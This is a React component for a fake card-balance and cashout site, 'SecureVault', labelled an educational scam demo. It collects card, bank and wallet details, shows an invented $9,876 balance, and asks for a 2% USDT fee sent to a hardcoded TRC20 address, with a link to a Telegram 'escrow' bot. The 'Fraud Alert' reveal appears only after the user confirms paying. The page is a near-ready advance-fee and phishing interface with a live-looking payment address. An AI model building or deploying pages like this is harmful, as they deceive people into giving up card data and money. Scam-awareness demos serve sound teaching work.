import { useState } from "react";
import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, ExternalLink, Copy, Check } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

const CRYPTO_EXCHANGES = [
  "Binance", "Coinbase", "Kraken", "KuCoin", "Bybit", "OKX", "Bitfinex", 
  "Gemini", "Bitstamp", "Gate.io", "Huobi", "Crypto.com", "FTX", "Bittrex"
];

const CRYPTO_COINS = [
  "BTC", "ETH", "USDT", "USDC", "BNB", "XRP", "ADA", "DOGE", "SOL", "DOT", "MATIC", "LTC"
];

const COIN_NETWORKS: Record<string, string[]> = {
  "BTC": ["Bitcoin", "Lightning Network"],
  "ETH": ["Ethereum (ERC20)", "Arbitrum", "Optimism", "Base"],
  "USDT": ["Tron (TRC20)", "Ethereum (ERC20)", "BNB Smart Chain (BEP20)", "Solana", "Polygon", "Avalanche"],
  "USDC": ["Ethereum (ERC20)", "Solana", "Polygon", "Arbitrum", "Avalanche", "Base"],
  "BNB": ["BNB Smart Chain (BEP20)", "BNB Beacon Chain (BEP2)"],
  "XRP": ["XRP Ledger"],
  "ADA": ["Cardano"],
  "DOGE": ["Dogecoin"],
  "SOL": ["Solana"],
  "DOT": ["Polkadot"],
  "MATIC": ["Polygon", "Ethereum (ERC20)"],
  "LTC": ["Litecoin"]
};

const FEE_PAYMENT_ADDRESS = "TZBh3GopUxDr9G6eCD5ShAT3ZgmsLRz8Bz";
const TELEGRAM_ESCROW_URL = "https://t.me/DealEsrowBot";

type PaymentMethod = "bank" | "crypto" | null;
type CashoutStep = "method" | "details" | "confirm" | "fee" | "payment" | "fraud";

const Dashboard = () => {
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showBalance, setShowBalance] = useState(false);
  const [showCashout, setShowCashout] = useState(false);
  
  // Cashout flow state
  const [cashoutStep, setCashoutStep] = useState<CashoutStep>("method");
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(null);
  
  // Bank details
  const [bankName, setBankName] = useState("");
  const [accountName, setAccountName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  
  // Crypto details
  const [exchange, setExchange] = useState("");
  const [coin, setCoin] = useState("");
  const [network, setNetwork] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [amount, setAmount] = useState("9876");
  
  // Payment confirmation
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [copied, setCopied] = useState(false);

  const balance = 9876;
  const fee = balance * 0.02;
  const netAmount = balance - fee;

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : value;
  };

  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4);
    }
    return v;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    await new Promise((resolve) => setTimeout(resolve, 3000));
    setIsProcessing(false);
    setShowBalance(true);
  };

  const handleProceed = () => {
    setShowBalance(false);
    setShowCashout(true);
    setCashoutStep("method");
  };

  const handleMethodSelect = (method: PaymentMethod) => {
    setPaymentMethod(method);
    setCashoutStep("details");
  };

  const handleDetailsSubmit = () => {
    setCashoutStep("confirm");
  };

  const handleConfirm = () => {
    setCashoutStep("fee");
  };

  const handlePayFee = () => {
    setCashoutStep("payment");
  };

  const handlePaymentConfirmed = () => {
    setCashoutStep("fraud");
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(FEE_PAYMENT_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const resetCashout = () => {
    setShowCashout(false);
    setCashoutStep("method");
    setPaymentMethod(null);
    setBankName("");
    setAccountName("");
    setAccountNumber("");
    setRoutingNumber("");
    setExchange("");
    setCoin("");
    setNetwork("");
    setWalletAddress("");
    setAmount("9876");
    setPaymentConfirmed(false);
    setCopied(false);
  };

  const handleCoinChange = (selectedCoin: string) => {
    setCoin(selectedCoin);
    setNetwork(""); // Reset network when coin changes
  };

  const renderCashoutContent = () => {
    switch (cashoutStep) {
      case "method":
        return (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-primary/20 flex items-center justify-center">
                  <Wallet className="w-8 h-8 text-primary" />
                </div>
                <span className="text-lg font-display">Select Payment Method</span>
              </DialogTitle>
            </DialogHeader>
            <div className="grid grid-cols-2 gap-4 py-4">
              <button
                onClick={() => handleMethodSelect("bank")}
                className="glass-card p-6 rounded-xl border-2 border-transparent hover:border-primary transition-all text-center group"
              >
                <Building2 className="w-10 h-10 mx-auto mb-3 text-primary group-hover:scale-110 transition-transform" />
                <p className="font-semibold text-foreground">Bank Transfer</p>
                <p className="text-xs text-muted-foreground mt-1">Direct to your account</p>
              </button>
              <button
                onClick={() => handleMethodSelect("crypto")}
                className="glass-card p-6 rounded-xl border-2 border-transparent hover:border-primary transition-all text-center group"
              >
                <Bitcoin className="w-10 h-10 mx-auto mb-3 text-primary group-hover:scale-110 transition-transform" />
                <p className="font-semibold text-foreground">Cryptocurrency</p>
                <p className="text-xs text-muted-foreground mt-1">To your wallet</p>
              </button>
            </div>
          </>
        );

      case "details":
        return paymentMethod === "bank" ? (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-primary/20 flex items-center justify-center">
                  <Building2 className="w-6 h-6 text-primary" />
                </div>
                <span className="text-lg font-display">Bank Details</span>
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Bank Name</label>
                <Input
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  placeholder="e.g., Chase, Bank of America"
                  className="h-11 bg-input border-border"
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Account Holder Name</label>
                <Input
                  value={accountName}
                  onChange={(e) => setAccountName(e.target.value)}
                  placeholder="John Doe"
                  className="h-11 bg-input border-border"
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Account Number</label>
                <Input
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ""))}
                  placeholder="123456789"
                  className="h-11 bg-input border-border font-mono"
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Routing Number</label>
                <Input
                  value={routingNumber}
                  onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, "").slice(0, 9))}
                  placeholder="021000021"
                  maxLength={9}
                  className="h-11 bg-input border-border font-mono"
                  required
                />
              </div>
              <Button
                onClick={handleDetailsSubmit}
                disabled={!bankName || !accountName || !accountNumber || !routingNumber}
                className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
              >
                Continue <ArrowRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </>
        ) : (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-primary/20 flex items-center justify-center">
                  <Bitcoin className="w-6 h-6 text-primary" />
                </div>
                <span className="text-lg font-display">Crypto Details</span>
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Exchange</label>
                <Select value={exchange} onValueChange={setExchange}>
                  <SelectTrigger className="h-11 bg-input border-border">
                    <SelectValue placeholder="Select exchange" />
                  </SelectTrigger>
                  <SelectContent className="bg-background border-border">
                    {CRYPTO_EXCHANGES.map((ex) => (
                      <SelectItem key={ex} value={ex}>{ex}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Coin</label>
                <Select value={coin} onValueChange={handleCoinChange}>
                  <SelectTrigger className="h-11 bg-input border-border">
                    <SelectValue placeholder="Select coin" />
                  </SelectTrigger>
                  <SelectContent className="bg-background border-border">
                    {CRYPTO_COINS.map((c) => (
                      <SelectItem key={c} value={c}>{c}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              {coin && COIN_NETWORKS[coin] && (
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground/80">Network</label>
                  <Select value={network} onValueChange={setNetwork}>
                    <SelectTrigger className="h-11 bg-input border-border">
                      <SelectValue placeholder="Select network" />
                    </SelectTrigger>
                    <SelectContent className="bg-background border-border">
                      {COIN_NETWORKS[coin].map((n) => (
                        <SelectItem key={n} value={n}>{n}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Wallet Address</label>
                <Input
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="0x..."
                  className="h-11 bg-input border-border font-mono text-sm"
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Amount (USD)</label>
                <Input
                  value={amount}
                  onChange={(e) => setAmount(e.target.value.replace(/\D/g, ""))}
                  placeholder="9876"
                  className="h-11 bg-input border-border font-mono"
                  required
                />
              </div>
              <Button
                onClick={handleDetailsSubmit}
                disabled={!exchange || !coin || !network || !walletAddress || !amount}
                className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
              >
                Continue <ArrowRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </>
        );

      case "confirm":
        return (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-primary/20 flex items-center justify-center">
                  <CheckCircle className="w-6 h-6 text-primary" />
                </div>
                <span className="text-lg font-display">Confirm Details</span>
              </DialogTitle>
            </DialogHeader>
            <div className="py-4">
              <div className="bg-secondary/50 rounded-lg p-4 space-y-3 text-sm">
                {paymentMethod === "bank" ? (
                  <>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Method</span>
                      <span className="font-medium text-foreground">Bank Transfer</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Bank</span>
                      <span className="font-medium text-foreground">{bankName}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Account Name</span>
                      <span className="font-medium text-foreground">{accountName}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Account Number</span>
                      <span className="font-medium text-foreground font-mono">****{accountNumber.slice(-4)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Routing</span>
                      <span className="font-medium text-foreground font-mono">{routingNumber}</span>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Method</span>
                      <span className="font-medium text-foreground">Crypto</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Exchange</span>
                      <span className="font-medium text-foreground">{exchange}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Coin</span>
                      <span className="font-medium text-foreground">{coin}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Network</span>
                      <span className="font-medium text-foreground">{network}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Address</span>
                      <span className="font-medium text-foreground font-mono text-xs">{walletAddress.slice(0, 8)}...{walletAddress.slice(-6)}</span>
                    </div>
                  </>
                )}
                <div className="border-t border-border pt-3 mt-3">
                  <div className="flex justify-between text-base">
                    <span className="text-muted-foreground">Amount</span>
                    <span className="font-bold gold-text">${balance.toLocaleString()}</span>
                  </div>
                </div>
              </div>
              <Button
                onClick={handleConfirm}
                className="w-full h-11 mt-4 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
              >
                Confirm Withdrawal <ArrowRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </>
        );

      case "fee":
        return (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-accent/20 flex items-center justify-center">
                  <DollarSign className="w-6 h-6 text-accent" />
                </div>
                <span className="text-lg font-display">Processing Fee Required</span>
              </DialogTitle>
            </DialogHeader>
            <div className="py-4">
              <div className="bg-secondary/50 rounded-lg p-4 space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Withdrawal Amount</span>
                  <span className="font-medium text-foreground">${balance.toLocaleString()}</span>
                </div>
                <div className="flex justify-between text-destructive">
                  <span>Processing Fee (2%)</span>
                  <span className="font-medium">-${fee.toFixed(2)}</span>
                </div>
                <div className="border-t border-border pt-3 mt-3">
                  <div className="flex justify-between text-base">
                    <span className="font-medium text-foreground">You'll Receive</span>
                    <span className="font-bold gold-text">${netAmount.toFixed(2)}</span>
                  </div>
                </div>
              </div>
              <p className="text-xs text-muted-foreground text-center mt-3">
                A 2% processing fee is required to complete your withdrawal
              </p>
              <Button
                onClick={handlePayFee}
                className="w-full h-11 mt-4 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
              >
                Pay ${fee.toFixed(2)} & Complete <ArrowRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </>
        );

      case "payment":
        return (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-primary/20 flex items-center justify-center">
                  <Wallet className="w-6 h-6 text-primary" />
                </div>
                <span className="text-lg font-display">Pay Processing Fee</span>
              </DialogTitle>
            </DialogHeader>
            <div className="py-4 space-y-4">
              <div className="bg-secondary/50 rounded-lg p-4 text-center">
                <p className="text-sm text-muted-foreground mb-2">Send exactly</p>
                <p className="text-2xl font-bold gold-text">${fee.toFixed(2)} USDT</p>
                <p className="text-xs text-muted-foreground mt-1">on TRC20 network</p>
              </div>
              
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Payment Address</label>
                <div className="flex items-center gap-2">
                  <Input
                    value={FEE_PAYMENT_ADDRESS}
                    readOnly
                    className="h-11 bg-input border-border font-mono text-xs flex-1"
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="icon"
                    onClick={copyAddress}
                    className="h-11 w-11 shrink-0"
                  >
                    {copied ? <Check className="w-4 h-4 text-chart-2" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </div>

              <div className="bg-accent/10 border border-accent/30 rounded-lg p-3">
                <p className="text-xs text-accent font-medium mb-2">💡 Use Telegram Escrow for secure payment</p>
                <a
                  href={TELEGRAM_ESCROW_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 text-sm text-primary hover:underline"
                >
                  <ExternalLink className="w-4 h-4" />
                  Open DealEscrowBot
                </a>
              </div>

              <div className="flex items-center gap-3 p-3 bg-secondary/30 rounded-lg">
                <input
                  type="checkbox"
                  id="paymentConfirmed"
                  checked={paymentConfirmed}
                  onChange={(e) => setPaymentConfirmed(e.target.checked)}
                  className="w-4 h-4 rounded border-border"
                />
                <label htmlFor="paymentConfirmed" className="text-sm text-foreground">
                  I have made the payment via escrow or direct transfer
                </label>
              </div>

              <Button
                onClick={handlePaymentConfirmed}
                disabled={!paymentConfirmed}
                className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
              >
                Proceed <ArrowRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </>
        );

      case "fraud":
        return (
          <>
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
                  <Shield className="w-8 h-8 text-destructive" />
                </div>
                <span className="text-lg font-display text-destructive">Fraud Alert!</span>
              </DialogTitle>
            </DialogHeader>
            <div className="text-center py-4">
              <p className="text-foreground font-medium mb-3">
                🚨 This is how scammers steal your money!
              </p>
              <div className="bg-secondary/50 rounded-lg p-4 text-left text-sm text-muted-foreground space-y-2">
                <p>• Never enter real card details on unknown websites</p>
                <p>• Legitimate services don't promise instant cashouts</p>
                <p>• <strong className="text-destructive">Processing fees are a major red flag!</strong></p>
                <p>• Scammers collect your bank/crypto details to steal money</p>
                <p>• Always verify website authenticity</p>
                <p>• Report suspicious sites to authorities</p>
              </div>
            </div>
            <p className="text-xs text-center text-muted-foreground">
              This demo is for educational purposes only
            </p>
            <Button
              onClick={resetCashout}
              variant="outline"
              className="w-full mt-4"
            >
              Close Demo
            </Button>
          </>
        );
    }
  };

  return (
    <div className="min-h-screen p-4 md:p-8 relative overflow-hidden">
      {/* Background */}
      <div className="absolute inset-0 bg-gradient-to-br from-background via-background to-secondary/20" />
      <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-primary/5 rounded-full blur-3xl" />

      <div className="relative z-10 max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-accent flex items-center justify-center">
              <CreditCard className="w-5 h-5 text-primary-foreground" />
            </div>
            <span className="text-xl font-display font-bold gold-text">SecureVault</span>
          </div>
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <Shield className="w-4 h-4 text-primary" />
            <span>Secure Session</span>
          </div>
        </div>

        {/* Warning Banner */}
        <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-3 mb-6">
          <p className="text-xs text-destructive text-center font-medium">
            ⚠️ EDUCATIONAL DEMO - No real card details should be entered
          </p>
        </div>

        {/* Main Card */}
        <div className="glass-card rounded-2xl p-6 md:p-8">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 rounded-xl bg-secondary flex items-center justify-center">
              <DollarSign className="w-6 h-6 text-primary" />
            </div>
            <div>
              <h2 className="text-xl font-display font-semibold text-foreground">Link Your Card</h2>
              <p className="text-sm text-muted-foreground">Enter your card details to check balance</p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Cardholder Name */}
            <div className="space-y-2">
              <label className="text-sm font-medium text-foreground/80">Cardholder Name</label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                <Input
                  type="text"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value)}
                  placeholder="John Doe"
                  className="pl-11 h-12 bg-input border-border focus:border-primary input-glow"
                  required
                />
              </div>
            </div>

            {/* Card Number */}
            <div className="space-y-2">
              <label className="text-sm font-medium text-foreground/80">Card Number</label>
              <div className="relative">
                <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                <Input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  className="pl-11 h-12 bg-input border-border focus:border-primary input-glow font-mono tracking-wider"
                  required
                />
              </div>
            </div>

            {/* Expiry and CVV */}
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">Expiry Date</label>
                <div className="relative">
                  <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                  <Input
                    type="text"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    placeholder="MM/YY"
                    maxLength={5}
                    className="pl-11 h-12 bg-input border-border focus:border-primary input-glow font-mono"
                    required
                  />
                </div>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground/80">CVV</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                  <Input
                    type="password"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    placeholder="•••"
                    maxLength={4}
                    className="pl-11 h-12 bg-input border-border focus:border-primary input-glow font-mono"
                    required
                  />
                </div>
              </div>
            </div>

            <Button
              type="submit"
              disabled={isProcessing}
              className="w-full h-12 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold hover:opacity-90 transition-opacity"
            >
              {isProcessing ? (
                <div className="flex items-center gap-3">
                  <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                  <span>Verifying Card...</span>
                </div>
              ) : (
                "Check Balance"
              )}
            </Button>
          </form>
        </div>

        <p className="text-center text-muted-foreground text-xs mt-6">
          Your data is protected with bank-level security
        </p>
      </div>

      {/* Processing Overlay */}
      {isProcessing && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="glass-card rounded-2xl p-8 text-center max-w-sm mx-4">
            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-primary/20 flex items-center justify-center">
              <div className="w-10 h-10 border-3 border-primary/30 border-t-primary rounded-full animate-spin" />
            </div>
            <h3 className="text-lg font-display font-semibold text-foreground mb-2">Processing</h3>
            <p className="text-sm text-muted-foreground">Securely verifying your card details...</p>
          </div>
        </div>
      )}

      {/* Balance Dialog */}
      <Dialog open={showBalance} onOpenChange={setShowBalance}>
        <DialogContent className="glass-card border-border max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-chart-2/20 flex items-center justify-center">
                <DollarSign className="w-8 h-8 text-chart-2" />
              </div>
              <span className="text-lg font-display">Card Verified Successfully</span>
            </DialogTitle>
          </DialogHeader>
          <div className="text-center py-4">
            <p className="text-muted-foreground text-sm mb-2">Available Balance</p>
            <p className="text-4xl font-display font-bold gold-text">$9,876</p>
            <p className="text-xs text-muted-foreground mt-2">Ready for withdrawal</p>
          </div>
          <Button
            onClick={handleProceed}
            className="w-full h-12 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold hover:opacity-90 transition-opacity"
          >
            Proceed to Cashout
            <ArrowRight className="w-4 h-4 ml-2" />
          </Button>
        </DialogContent>
      </Dialog>

      {/* Cashout Flow Dialog */}
      <Dialog open={showCashout} onOpenChange={(open) => !open && resetCashout()}>
        <DialogContent className="glass-card border-border max-w-md">
          {renderCashoutContent()}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Dashboard;
